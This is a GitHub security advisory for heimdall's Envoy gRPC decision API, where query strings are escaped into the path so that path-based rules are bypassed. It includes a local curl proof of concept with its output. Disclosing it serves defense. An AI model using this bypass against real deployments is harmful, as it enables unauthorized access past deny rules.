# [H] Heimdall: Path received via Envoy gRPC corrupted when containing query string

## Summary
Severity: High
Advisory: GHSA-r8x2-fhmf-6mxp
CVE: CVE-2026-32811
CWE: CWE-116, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-r8x2-fhmf-6mxp
Type: github-advisory

## Affected
- Go: `github.com/dadrus/heimdall` — affected >=0.7.0-alpha <0.17.11

## Details
### Summary
When using heimdall in envoy gRPC decision API mode, wrong encoding of the query URL string allows rules with non-wildcard path expressions to be bypassed.

The HTTP based decision API is NOT affected, and proxy mode is NOT affected either.

**Note:** The issue can only lead to unintended access if heimdall is configured with an "allow all" default rule. Since v0.16.0, heimdall enforces secure defaults and refuses to start with such a configuration unless this enforcement is explicitly disabled, e.g. via `--insecure-skip-secure-default-rule-enforcement` or the broader `--insecure` flag.

### Details
Envoy splits the requested URL into parts, and sends the parts individually to heimdall. Although `query` and `path` are present in the API, the `query` field is documented to be always empty and the URL query is included in the `path` field [1].

The implementation uses go's url library to reconstruct the url which automatically encodes special characters in the path. 

 https://github.com/dadrus/heimdall/blob/1faba9e4160bd7ab3240cf6aa418e21bfef3401a/internal/handler/envoyextauth/grpcv3/request_context.go#L109-L115

As a consequence, a parameter like `/mypath?foo=bar` to `Path`  is escaped into  `/mypath%3Ffoo=bar`. Subsequently, a rule matching `/mypath` no longer matches and is bypassed.


### PoC

Using the example docker compose setup, the `demo:public` rule is bypassed when adding a query parameter.

> docker compose -f docker-compose-envoy-grpc.yaml -f docker-compose.yaml up

```
curl http://127.0.0.1:9090/public
Hostname: 80201fead1c7
IP: 127.0.0.1
IP: ::1
IP: 172.23.0.3
RemoteAddr: 172.23.0.5:37056
GET /public HTTP/1.1
Host: 127.0.0.1:9090
User-Agent: curl/8.19.0
Accept: */*
X-Envoy-Expected-Rq-Timeout-Ms: 15000
X-Forwarded-Proto: http
X-Request-Id: 0a1f0f06-75ef-4f14-92af-16162ea1d9e5

curl -v http://127.0.0.1:9090/public?bypass
*   Trying 127.0.0.1:9090...
* Established connection to 127.0.0.1 (127.0.0.1 port 9090) from 127.0.0.1 port 47876 
* using HTTP/1.x
> GET /public?hallo HTTP/1.1
> Host: 127.0.0.1:9090
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< date: Sat, 14 Mar 2026 16:34:17 GMT
< server: envoy
< content-length: 0
< 
* Connection #0 to host 127.0.0.1:9090 left intact
```

When using the HTTP decision API variant, the second request is matched by the rule as well:

> docker compose -f docker-compose-envoy-http.yaml -f docker-compose.yaml up

```
curl http://127.0.0.1:9090/public?bypass
Hostname: 80201fead1c7
IP: 127.0.0.1
IP: ::1
IP: 172.23.0.4
RemoteAddr: 172.23.0.2:38044
GET /public?hallo HTTP/1.1
Host: 127.0.0.1:9090
User-Agent: curl/8.19.0
Accept: */*
X-Envoy-Expected-Rq-Timeout-Ms: 15000
X-Forwarded-Proto: http
X-Request-Id: 5c961bc6-ad03-4a44-982b-abe04566fdd2
```

### Impact

Everyone using heimdall with the envoy gRPC API may be affected. Users who configured a deny list in heimdall (with an allow-all default rule) are affected, as attackers can potentially circumvent a specific block rule by adding query parameters.

[1] https://github.com/envoyproxy/envoy/blob/105b4acd422d67fcff908ec38d91c7676d079939/api/envoy/service/auth/v3/attribute_context.proto#L146-L147

## References
- https://github.com/dadrus/heimdall/security/advisories/GHSA-r8x2-fhmf-6mxp
- https://nvd.nist.gov/vuln/detail/CVE-2026-32811
- https://github.com/dadrus/heimdall/pull/3106
- https://github.com/dadrus/heimdall/commit/50321b3007db1ccafdc6b1cfd6bdc3689c19a502
- https://github.com/dadrus/heimdall
- https://github.com/envoyproxy/envoy/blob/105b4acd422d67fcff908ec38d91c7676d079939/api/envoy/service/auth/v3/attribute_context.proto#L146-L147
